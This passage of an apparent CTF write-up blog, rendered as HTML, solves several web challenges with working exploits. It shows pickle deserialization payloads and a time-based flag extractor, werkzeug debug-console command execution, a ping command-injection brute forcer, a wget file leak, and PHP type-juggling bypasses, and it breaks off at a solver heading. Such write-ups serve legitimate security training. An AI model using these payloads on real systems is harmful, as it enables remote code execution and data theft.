+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Raw: &#39;</span>, <span style="color:#e6db74">&#34;cposix\nsystem\np0\n(S&#39;ls</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">grep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;&amp;</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">sleep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">5&#39;\np1\ntp2\nRp3\n.&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Base64: &#39;</span>, u<span style="color:#e6db74">&#39;Y3Bvc2l4CnN5c3RlbQpwMAooUydscyR7SUZTfXwke0lGU31ncmVwJHtJRlN9ZmxhZyR7SUZTfSYmJHtJRlN9c2xlZXAke0lGU301JwpwMQp0cDIKUnAzCi4=&#39;</span><span style="color:#f92672">)</span>
+0:00:05.092808
+ls | grep flagfoo <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">5</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Raw: &#39;</span>, <span style="color:#e6db74">&#34;cposix\nsystem\np0\n(S&#39;ls</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">grep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">flagfoo</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;&amp;</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">sleep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">5&#39;\np1\ntp2\nRp3\n.&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Base64: &#39;</span>, u<span style="color:#e6db74">&#39;Y3Bvc2l4CnN5c3RlbQpwMAooUydscyR7SUZTfXwke0lGU31ncmVwJHtJRlN9ZmxhZ2ZvbyR7SUZTfSYmJHtJRlN9c2xlZXAke0lGU301JwpwMQp0cDIKUnAzCi4=&#39;</span><span style="color:#f92672">)</span>
+0:00:00.147667
+cat flag | grep ctf<span style="color:#f92672">{</span> <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">3</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Raw: &#39;</span>, <span style="color:#e6db74">&#34;cposix\nsystem\np0\n(S&#39;cat</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">grep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">ctf{</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;&amp;</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">sleep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">3&#39;\np1\ntp2\nRp3\n.&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Base64: &#39;</span>, u<span style="color:#e6db74">&#39;Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQke0lGU31mbGFnJHtJRlN9fCR7SUZTfWdyZXAke0lGU31jdGZ7JHtJRlN9JiYke0lGU31zbGVlcCR7SUZTfTMnCnAxCnRwMgpScDMKLg==&#39;</span><span style="color:#f92672">)</span>
+0:00:03.096160
+</code></pre></div><p>Making a loop to iterate over <code>string.hexdigits[:16] + &#34;}&#34;</code> should be enough to slowly retrieve the flag.</p>
+<p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> pickle
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://mirror/&#34;</span>
+charset <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>hexdigits[:<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>(object):
+    <span style="color:#66d9ef">def</span> __init__(self, cmd):
+        self<span style="color:#f92672">.</span>cmd <span style="color:#f92672">=</span> cmd
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>system, (self<span style="color:#f92672">.</span>cmd,)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    extracted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ctf{&#34;</span>
+    finished <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> finished:
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> charset:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cat flag | grep </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &amp;&amp; sleep 3&#39;</span> <span style="color:#f92672">%</span> (extracted <span style="color:#f92672">+</span> i)
+            cmd <span style="color:#f92672">=</span> cmd<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;$</span><span style="color:#e6db74">{IFS}</span><span style="color:#e6db74">&#39;</span>)
+            print(cmd)
+
+            pickled <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(RCE(cmd))
+            req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
+                url, data<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(pickled)<span style="color:#f92672">.</span>decode()
+            )
+
+            print(req<span style="color:#f92672">.</span>elapsed)
+            <span style="color:#66d9ef">if</span> int(req<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
+                extracted <span style="color:#f92672">+=</span> i
+                <span style="color:#66d9ef">break</span>
+
+            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> charset[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+                finished <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</code></pre></div><pre tabindex="0"><code>cat${IFS}flag${IFS}|${IFS}grep${IFS}ctf{e687c7f3f6ae2d8154dfae81b5caa978ffdebe42142234e06de26e61c95e3371}${IFS}&amp;&amp;${IFS}sleep${IFS}3
+0:00:03.091999
+</code></pre><h1 id="slightly-broken">slightly-broken</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+  &lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+  &lt;<span style="color:#f92672">body</span>&gt;Now go get the flag: 
+    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/getflag?cmd&amp;amp;a&amp;amp;b&amp;amp;c&amp;amp;d&amp;amp;e&amp;amp;f&amp;amp;g&amp;amp;h&amp;amp;i&amp;amp;j&amp;amp;k&amp;amp;l&amp;amp;m%n#d&#34;</span>&gt;Enjoy!&lt;/<span style="color:#f92672">a</span>&gt;
+  &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>Following the link leads us to a werkzeug debug console (<a href="#rundown">similar challenge</a>).</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134817950-a94f8966-e0a1-45f5-843d-bc8e4e85228f.png" alt="imagen"/></p>
+<p>Then we can execute arbitrary python code by clicking any shell in the debug console.</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; __import__(&#39;os&#39;).popen(&#39;ls&#39;).readlines()
+[&#39;app.py\n&#39;, &#39;flag.txt\n&#39;]
+&gt;&gt;&gt; __import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).readlines()
+[&#39;ECSC{672e1423c22222e4e4c87e27a443b4b72c298c84f13d3ddeb771b9458ce33f32}&#39;]
+</code></pre><h1 id="ping-station">ping-station</h1>
+<p>We are given the source code of the webapp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, url_for, request, redirect
+
+<span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> string
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_valid_ip</span>(ip):
+    ipv <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;</span>,ip)
+    <span style="color:#66d9ef">return</span> bool(ipv) 
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;GET&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+        ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;content&#39;</span>]
+        <span style="color:#66d9ef">if</span> (is_valid_ip(ip)<span style="color:#f92672">==</span><span style="color:#66d9ef">True</span>):
+            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>):
+                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">+</span>subprocess<span style="color:#f92672">.</span>check_output(<span style="color:#e6db74">&#34;ping -c 4 &#34;</span><span style="color:#f92672">+</span>ip,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>
+                <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span><span style="color:#e6db74">&#34;That&#39;s not a valid IP&#34;</span>
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    app<span style="color:#f92672">.</span>run(host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
+</code></pre></div><p>We have to provide a string matching <code>^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$</code> by <code>request.form[&#39;content&#39;]</code>. Then it will be used inside a ping command.</p>
+<p>Trying to execute commands with backslashes didn’t allow me to read the error message reflecting the output of the command, but being allowed to sleep is enough to solve the challenge. <a href="#rundown">Same technique on a different challenge</a>.</p>
+<p>Let’s automate it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://mirror/&#34;</span>
+charset <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>
+
+extracted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ECSC&#34;</span> <span style="color:#75715e"># Test first ctf or ECSC</span>
+finished <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+<span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> finished:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> charset:
+        data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;content&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;127.0.0.1`cat flag | grep </span><span style="color:#e6db74">{</span>extracted <span style="color:#f92672">+</span> i<span style="color:#e6db74">}</span><span style="color:#e6db74"> &amp;&amp; sleep 3`&#34;</span>}
+        print(data)
+        req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data)
+
+        print(req<span style="color:#f92672">.</span>elapsed)
+        <span style="color:#66d9ef">if</span> int(req<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
+            extracted <span style="color:#f92672">+=</span> i
+            <span style="color:#66d9ef">break</span>
+
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> charset[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+            finished <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+
+print(extracted)
+</code></pre></div><pre tabindex="0"><code>{&#39;content&#39;: &#39;127.0.0.1`cat flag | grep ECSC{b1c0bc8e5e1b4c81199ad3c41bef8b69bea3ab86ecfb08c211d90ace0ff98df3} &amp;&amp; sleep 3`&#39;}
+0:00:03.099812
+</code></pre><h1 id="downloader-v1">downloader-v1</h1>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820250-60260721-226a-4809-b8f9-7a58fef605c5.png" alt="imagen"/></p>
+<p>We get a photo downloader. Submitting the placeholder gives us more information:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820281-27d1b188-9485-4718-907a-e27dbd51058c.png" alt="imagen"/></p>
+<p>Taking a look at <code>wget -h</code> we can notice an option <code>--body-file</code> to append the content of a file to the request.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820336-1cbd092f-9d6d-415c-a93f-3ab18cbb38e5.png" alt="imagen"/></p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820343-34b7c23b-02b9-415e-9c77-34a44b76ced8.png" alt="imagen"/></p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820361-106bc145-2bb5-40fa-9129-a43aadde23c2.png" alt="imagen"/></p>
+<p>By looking at <code>index.php</code>’s contents I noticed <code>&lt;!-- &lt;a href=&#34;flag.php&#34;&gt;###&lt;/a&gt; --&gt;</code>.</p>
+<p>Leaking <code>flag.php</code> gives us the flag.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820395-4b60ffdc-705c-45e3-85ff-97e9caaefd19.png" alt="imagen"/></p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134820411-bb59bcb0-0102-476a-909f-942bc9ab3480.png" alt="imagen"/></p>
+<h1 id="puzzled">puzzled</h1>
+<p>We are given a php snippet that prints the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;secrets.php&#39;</span>;
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateRandomString</span>($length <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>) {
+    $characters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>;
+    $charactersLength <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($characters);
+    $randomString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $length; $i<span style="color:#f92672">++</span>) {
+        $randomString <span style="color:#f92672">.=</span> $characters[<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>, $charactersLength <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)];
+    }
+    <span style="color:#66d9ef">return</span> $randomString;
+}
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>])){
+    $pass <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateRandomString</span>(<span style="color:#ae81ff">95</span>);
+    $user_input <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>]);
+    <span style="color:#66d9ef">if</span> ($pass <span style="color:#f92672">!=</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pass</span>) {
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+        <span style="color:#66d9ef">exit</span>;
+    }
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+
+<span style="color:#66d9ef">if</span> ($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">token</span> <span style="color:#f92672">!=</span> $secret_token) {;
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">strlen</span>($secret_token);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+
+$key <span style="color:#f92672">=</span> $secret_token;
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;key&#39;</span>])) {
+    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $_GET[<span style="color:#e6db74">&#39;key&#39;</span>], $secret_token); 
+}
+
+$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>, $key);
+
+<span style="color:#66d9ef">if</span> ($hash <span style="color:#f92672">!==</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hash</span>) {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+
+$black <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;php&#39;</span>, <span style="color:#e6db74">&#39;passthru&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;assert&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;preg_replace&#39;</span>, <span style="color:#e6db74">&#39;e(&#39;</span>, <span style="color:#e6db74">&#39;n(&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;%28&#39;</span>];
+<span style="color:#66d9ef">foreach</span> ($black <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>, $value) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+        <span style="color:#66d9ef">exit</span>;
+    }
+}
+
+$login <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>);
+
+<span style="color:#66d9ef">if</span> ($login[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">==</span> $User <span style="color:#f92672">&amp;&amp;</span> $login[<span style="color:#e6db74">&#39;pass&#39;</span>] <span style="color:#f92672">==</span> $Pass) {
+    $admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+
+<span style="color:#66d9ef">if</span>($admin){
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>])) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>], $secret_token) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">echo</span> $flag;
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Try Harder!&#39;</span>;
+        }
+    }
+}
+</code></pre></div><p>First bypass:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>])){
+    $pass <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateRandomString</span>(<span style="color:#ae81ff">95</span>);
+    $user_input <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>]);
+    <span style="color:#66d9ef">if</span> ($pass <span style="color:#f92672">!=</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pass</span>) {
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+        <span style="color:#66d9ef">exit</span>;
+    }
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+</code></pre></div><p><code>json_decode($_GET[&#39;pass&#39;])-&gt;pass</code> = <code>?pass={&#39;pass&#39;:this}</code> must equal (by a loose comparison) <code>$pass</code>. Since <code>$pass</code> is not declared anywhere in this file, it must be declared inside <code>secrets.php</code> (included by <code>include &#39;secrets.php&#39;</code>).</p>
+<p>For the whole challenge we’ll be refering to a vulnerability called <a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/by-language/php/type-juggling/summary" target="_blank">Type Juggling</a>.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134883962-932d9c83-5642-41ab-a1a6-f9cfb286d783.png" alt="imagen"/></p>
+<p>For this first bypass, <code>$pass</code> which (I guess) is a string equals to <code>true</code> or <code>0</code>. So <code>&#39;pass&#39; =&gt; 0,</code> will let us get to the second bypass.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> ($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">token</span> <span style="color:#f92672">!=</span> $secret_token) {;
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">strlen</span>($secret_token);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+</code></pre></div><p>This time, <code>$user_input-&gt;token</code> (= <code>/?pass={&#34;token&#34;:this}</code>) must equal <code>$secret_token</code>, string that we don’t know again. As before, <code>0</code> and <code>true</code> will equal to this string, so <code>&#39;token&#39; =&gt; true</code> let us get to the third bypass.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$key <span style="color:#f92672">=</span> $secret_token;
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;key&#39;</span>])) {
+    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $_GET[<span style="color:#e6db74">&#39;key&#39;</span>], $secret_token); 
+}
+
+$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>, $key);
+
+<span style="color:#66d9ef">if</span> ($hash <span style="color:#f92672">!==</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hash</span>) {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+</code></pre></div><p>This time, <code>$hash</code> must <code>strictly</code> equal <code>$user_input-&gt;hash</code> (= <code>/?pass={&#34;hash&#34;:this}</code>). The only part of <code>$hash</code> we don’t control is <code>$secret_token</code> used to set the key for <code>$hash</code>. However, we can obtain an empty <code>$key</code> by providing <code>$_GET[&#39;key&#39;]</code> as an array (<code>hash_hmac</code> will throw a warning) and then completely control <code>$hash</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$login <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>);
+
+<span style="color:#66d9ef">if</span> ($login[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">==</span> $User <span style="color:#f92672">&amp;&amp;</span> $login[<span style="color:#e6db74">&#39;pass&#39;</span>] <span style="color:#f92672">==</span> $Pass) {
+    $admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+</code></pre></div><p>Finally, the webapp unserializes <code>/?pass={&#34;check&#34;:this}</code> and then compares <code>user</code> and <code>pass</code> inside the array with <code>secrets.php</code> values. As we’ve seen before, we may guess <code>$User</code> and <code>$Pass</code> are strings, so <code>true</code> or <code>0</code> will work to get to the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>($admin){
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>])) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>], $secret_token) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">echo</span> $flag;
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Try Harder!&#39;</span>;
+        }
+    }
+}
+</code></pre></div><p>Providing <code>/?something[]</code> will break <code>if (strcmp($_GET[&#39;something&#39;], $secret_token) == 0)</code> because <code>strcmp(array(), $anything)</code> returns <code>NULL</code>, and <code>NULL</code> equals <code>0</code> in loose comparison (<code>==</code>).</p>
+<p>Solver:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
